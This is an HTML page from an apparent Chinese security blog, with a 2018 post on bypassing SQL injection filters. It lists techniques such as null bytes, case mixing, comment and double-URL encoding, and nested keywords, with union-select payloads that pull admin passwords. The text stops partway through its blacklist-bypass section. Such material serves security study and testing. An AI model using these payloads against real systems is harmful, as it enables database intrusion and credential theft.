@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head>
+    <meta charset="utf-8">
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.5.2 -->
+    <script>
+        window.materialVersion = "1.5.2"
+        // Delete localstorage with these tags
+        window.oldVersion = [
+            'codestartv1',
+            '1.3.4',
+            '1.4.0',
+            '1.4.0b1',
+            '1.5.0'
+        ]
+    </script>
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <!-- Title -->
+    
+    <title>
+        
+            0x02 SQL注入绕过 | 
+        
+        张Mini
+    </title>
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/img/favicon.png">
+    <link rel="icon" href="/img/favicon.png">
+
+    <meta name="format-detection" content="telephone=no"/>
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content=",Web">
+    <meta name="theme-color" content="#535353">
+
+    <!-- Disable Fucking Bloody Baidu Tranformation -->
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(a){try{localStorage.removeItem(a)}catch(b){}};lsloader.setLS=function(a,c){try{localStorage.setItem(a,c)}catch(b){}};lsloader.getLS=function(a){var c="";try{c=localStorage.getItem(a)}catch(b){c=""}return c};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var b=[];for(var a=0;a<localStorage.length;a++){b.push(localStorage.key(a))}b.forEach(function(e){var f=lsloader.getLS(e);if(window.oldVersion){var d=window.oldVersion.reduce(function(g,h){return g||f.indexOf("/*"+h+"*/")!==-1},false);if(d){lsloader.removeLS(e)}}})}catch(c){}};lsloader.clean();lsloader.load=function(f,a,b,d){if(typeof b==="boolean"){d=b;b=undefined}d=d||false;b=b||function(){};var e;e=this.getLS(f);if(e&&e.indexOf(versionString)===-1){this.removeLS(f);this.requestResource(f,a,b,d);return}if(e){var c=e.split(versionString)[0];if(c!=a){console.log("reload:"+a);this.removeLS(f);this.requestResource(f,a,b,d);return}e=e.split(versionString)[1];if(d){this.jsRunSequence.push({name:f,code:e});this.runjs(a,f,e)}else{document.getElementById(f).appendChild(document.createTextNode(e));b()}}else{this.requestResource(f,a,b,d)}};lsloader.requestResource=function(b,e,a,c){var d=this;if(c){this.iojs(e,b,function(h,f,g){d.setLS(f,h+versionString+g);d.runjs(h,f,g)})}else{this.iocss(e,b,function(f){document.getElementById(b).appendChild(document.createTextNode(f));d.setLS(b,e+versionString+f)},a)}};lsloader.iojs=function(d,b,g){var a=this;a.jsRunSequence.push({name:b,code:""});try{var f=new XMLHttpRequest();f.open("get",d,true);f.onreadystatechange=function(){if(f.readyState==4){if((f.status>=200&&f.status<300)||f.status==304){if(f.response!=""){g(d,b,f.response);return}}a.jsfallback(d,b)}};f.send(null)}catch(c){a.jsfallback(d,b)}};lsloader.iocss=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.iofonts=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.runjs=function(f,c,e){if(!!c&&!!e){for(var b in this.jsRunSequence){if(this.jsRunSequence[b].name==c){this.jsRunSequence[b].code=e}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var a=document.createElement("script");a.appendChild(document.createTextNode(this.jsRunSequence[0].code));a.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(a);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else{if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var d=this;var a=document.createElement("script");a.src=this.jsRunSequence[0].path;a.type="text/javascript";this.jsRunSequence[0].status="loading";a.onload=function(){d.jsRunSequence.shift();if(d.jsRunSequence.length>0){d.runjs()}};document.body.appendChild(a)}}};lsloader.tagLoad=function(b,a){this.jsRunSequence.push({name:a,code:"",path:b,status:"failed"});this.runjs()};lsloader.jsfallback=function(c,b){if(!!this.jsnamemap[b]){return}else{this.jsnamemap[b]=b}for(var a in this.jsRunSequence){if(this.jsRunSequence[a].name==b){this.jsRunSequence[a].code="";this.jsRunSequence[a].status="failed";this.jsRunSequence[a].path=c}}this.runjs()};lsloader.cssfallback=function(e,c,b){if(!!this.cssnamemap[c]){return}else{this.cssnamemap[c]=1}var d=document.createElement("link");d.type="text/css";d.href=e;d.rel="stylesheet";d.onload=d.onerror=b;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(d,a)};lsloader.runInlineScript=function(c,b){var a=document.getElementById(b).innerText;this.jsRunSequence.push({name:c,code:a});this.runjs()}})();</script>
+
+    <!-- Import queue -->
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Import CSS -->
+    
+        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+        
+
+    
+
+    
+
+    <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+    overflow-x: hidden !important;
+  }
+  
+  code {
+    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+  }
+
+  a {
+    color: #00838F;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #535353 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #535353 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #535353 !important;
+  }
+
+  .toTop {
+    background: #757575 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #757575;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #757575;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #757575;
+  }
+
+  .post-toc a:hover {
+    color: #00838F;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-image: url(/img/bg.png);
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+<!-- Import Roboto -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+
+
+<!-- Import Material Icons -->
+
+
+    <style id="material_icons"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_icons","/css/material-icons.css?pqhB/Rd/ab0H2+kZp0RDmw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+
+
+
+    <!-- Import jQuery -->
+    
+        <script>lsloader.load("jq_js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==", true)</script>
+    
+
+    <!-- WebAPP Icons -->
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="application-name" content="张Mini">
+    <meta name="msapplication-starturl" content="http://yoursite.com/2018/05/24/2/">
+    <meta name="msapplication-navbutton-color" content="#535353">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-title" content="张Mini">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon" href="/img/favicon.png">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- RSS -->
+    
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="http://yoursite.com/2018/05/24/2/">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="0x02 SQL注入绕过 | 张Mini">
+    <meta property="og:image" content="/img/favicon.png">
+    <meta property="og:description" content="">
+    <meta property="og:article:tag" content="Web"> 
+
+    
+        <meta property="article:published_time" content="Thu May 24 2018 08:04:55 GMT+0800">
+        <meta property="article:modified_time" content="Thu May 24 2018 08:24:32 GMT+0800">
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="http://yoursite.com/2018/05/24/2/index.html" />
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://yoursite.com/2018/05/24/2/index.html",
+    "headline": "0x02 SQL注入绕过",
+    "datePublished": "Thu May 24 2018 08:04:55 GMT+0800",
+    "dateModified": "Thu May 24 2018 08:24:32 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "张Mini",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/avatar.png"
+        },
+        "description": "张Mini"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "张Mini",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/favicon.png"
+        }
+    },
+    "keywords": ",Web",
+    "description": "",
+}
+</script>
+
+
+    
+
+    <!-- Analytics -->
+    
+    
+    
+
+    <!-- Custom Head -->
+    
+
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入绕过"><span class="post-toc-number">1.</span> <span class="post-toc-text">SQL注入绕过</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#使用空字节"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">使用空字节</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#大小写变种"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">大小写变种</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#注释绕过"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">注释绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#URL编码绕过"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">URL编码绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#引号绕过"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">引号绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#逗号绕过"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">逗号绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#比较符-lt-gt-绕过"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">比较符(&lt;,&gt;)绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#嵌套剥离后的表达式"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">嵌套剥离后的表达式</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#黑名单绕过"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">黑名单绕过</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-过滤关键字-and-or"><span class="post-toc-number">1.9.1.</span> <span class="post-toc-text">1. 过滤关键字: and,or</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-过滤关键字-and-or-union"><span class="post-toc-number">1.9.2.</span> <span class="post-toc-text">2. 过滤关键字: and or union</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-过滤关键字-and-or-union-where"><span class="post-toc-number">1.9.3.</span> <span class="post-toc-text">3. 过滤关键字 and or union where</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#4-过滤关键字-and-or-union-where-limit"><span class="post-toc-number">1.9.4.</span> <span class="post-toc-text">4. 过滤关键字: and or union where limit</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#5-过滤关键字-and-or-union-where-limit-group-by"><span class="post-toc-number">1.9.5.</span> <span class="post-toc-text">5. 过滤关键字: and or union where limit group by</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#6-过滤关键字-and-or-union-where-limit-group-by-select"><span class="post-toc-number">1.9.6.</span> <span class="post-toc-text">6. 过滤关键字: and or union where limit group by select</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#7-过滤关键字-and-or-union-where-limit-group-by-select-‘"><span class="post-toc-number">1.9.7.</span> <span class="post-toc-text">7. 过滤关键字: and or union where limit group by select ‘</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#8-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex"><span class="post-toc-number">1.9.8.</span> <span class="post-toc-text">8. 过滤关键字: and or union where limit group by select ‘ hex</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#9-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr"><span class="post-toc-number">1.9.9.</span> <span class="post-toc-text">9. 过滤关键字:and or union where limit group by select ‘ hex substr</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#10-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr-空格"><span class="post-toc-number">1.9.10.</span> <span class="post-toc-text">10. 过滤关键字:  and or union where limit group by select ‘ hex substr 空格</span></a></li></ol></li></ol></li></ol>
+    </ul>
+    
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                0x02 SQL注入绕过
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>张Mini</strong>
+        <span>5月 24, 2018</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/Web/">Web</a>
+    </ul>
+    
+
+    <!-- Share -->
+    
+        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+
+    <!-- Share Weibo -->
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=0x02 SQL注入绕过&url=http://yoursite.com/2018/05/24/2/index.html&via=张Mini" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+
+    <!-- Share Google+ -->
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+    
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h1 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h1><hr>
+<h2 id="使用空字节"><a href="#使用空字节" class="headerlink" title="使用空字节"></a>使用空字节</h2><p>要想执行空字节攻击，只需在过滤器阻止的字符前面提供一个采用URL编码的空字节即可</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00' union <span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> tblUsers <span class="keyword">where</span> username=<span class="string">'admin'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<h2 id="大小写变种"><a href="#大小写变种" class="headerlink" title="大小写变种"></a>大小写变种</h2><p>如果某些关键字过滤器不够聪明，可以使用变换攻击字符串中字符的大小来避开</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'uNiOn <span class="keyword">SeLeCt</span> <span class="keyword">password</span> <span class="keyword">frOm</span> tblUsers <span class="keyword">WhErE</span> usermane=<span class="string">"admin"</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<h2 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h2><p>使用内联注释序列创建SQL代码段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">password</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>tblusers<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>username<span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="string">'admin'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<h2 id="URL编码绕过"><a href="#URL编码绕过" class="headerlink" title="URL编码绕过"></a>URL编码绕过</h2><p>2007年PHP-Nuke发现有一个漏洞所使用的过滤器能阻止空白符和内敛注释/* ，但无法阻止以注释序列所表示的URL编码<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'%2f%2a*/union%2f%2a*/select%2f%2a*/password%2f%2a*/from%2f%2a*/tblusers%2f%2a*/where%2f%2a*/username%2f%2a*/like%2f%2a*/'admin'--+</span><br></pre></td></tr></table></figure></p>
+<p>这种基本的URL编码攻击对其他情况不起作用，不过仍可以通过对被阻止的字符进行双URL编码来避开过滤器<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'%252f%252a*/union%252f%252a*/select%252f%252a*/password%252f%252a*/from%252f%252a*/tblusers%252f%252a*/where%252f%252a*/username%252f%252a*/like%252f%252a*/'admin'--+</span><br></pre></td></tr></table></figure></p>
+<p>双url编码有时会起作用</p>
+<h2 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">"example"</span></span><br></pre></td></tr></table></figure>
+<p>如果引号被过滤是没办法进行过滤的，这时候可以转换为十六进制</p>
+<h2 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h2><p>在使用盲注的时候，需要使用到 substr() ,mid(),limit。这些子句方法都需要使用到逗号。对于 substr() 和mid()这两个方法可以使用from to的方式来解决</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">to</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">mid</span>(<span class="keyword">database</span>(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">to</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<p>对于limit可以使用offset绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 等价于下面这条<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<h2 id="比较符-lt-gt-绕过"><a href="#比较符-lt-gt-绕过" class="headerlink" title="比较符(&lt;,&gt;)绕过"></a>比较符(&lt;,&gt;)绕过</h2><p>如果无法使用比较操作符，那么就需要使用greatest来进行过滤</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>))&gt;<span class="number">64</span></span><br></pre></td></tr></table></figure>
+<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">greatest</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)=<span class="number">64</span></span><br></pre></td></tr></table></figure>
+<h2 id="嵌套剥离后的表达式"><a href="#嵌套剥离后的表达式" class="headerlink" title="嵌套剥离后的表达式"></a>嵌套剥离后的表达式</h2><p>有些审查过滤器会先从用户输入中剥离特定的字符或表达式，然后在按照常用的方式处理剩下的数据。如果被剥离的表达式中包含两个或以上的字符，就不会递归应用过滤器。通常可以通过在禁止的表达式中嵌套自身来绕过过滤器</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selectselect</span><br></pre></td></tr></table></figure>
+<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h3 id="1-过滤关键字-and-or"><a href="#1-过滤关键字-and-or" class="headerlink" title="1. 过滤关键字: and,or"></a>1. 过滤关键字: and,or</h3><p>php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/(and|or)/i'</span>,$id)</span><br></pre></td></tr></table></figure>
+<p>会过滤的代码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 or 1=1 1 and 1=1</span><br></pre></td></tr></table></figure>
+<p>绕过方式<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 || 1=1 1 &amp;&amp; 1=1</span><br></pre></td></tr></table></figure></p>
+<p>下面这种方式你需要先知道一些表和字段名</p>
+<h3 id="2-过滤关键字-and-or-union"><a href="#2-过滤关键字-and-or-union" class="headerlink" title="2. 过滤关键字: and or union"></a>2. 过滤关键字: and or union</h3><p>php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/(and|or|union)/i'</span>,$id)</span><br></pre></td></tr></table></figure>
+<p>会过滤的代码<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure></p>
+<p>绕过方式</p>
